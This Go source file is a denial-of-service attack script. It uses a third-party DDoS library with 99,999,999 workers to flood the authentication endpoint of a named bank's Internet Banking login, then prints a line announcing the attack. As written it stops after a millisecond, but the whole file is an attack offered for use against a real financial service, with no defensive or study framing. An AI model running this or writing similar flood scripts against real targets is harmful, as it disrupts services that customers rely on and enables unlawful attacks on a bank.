package main

import (
	"fmt"
	"time"

	ddos "github.com/Konstantin8105/DDoS"
)

func main() {
	workers := 99999999
	website := "https://auth.aib.ie/as/ECkHq0OqP4/resume/as/authorization.ping?vnd_pi_application_name=Internet%20Banking"

	d, err := ddos.New(website, workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Millisecond)
	d.Stop()
	fmt.Println("DDoS attack server: " + website)

}
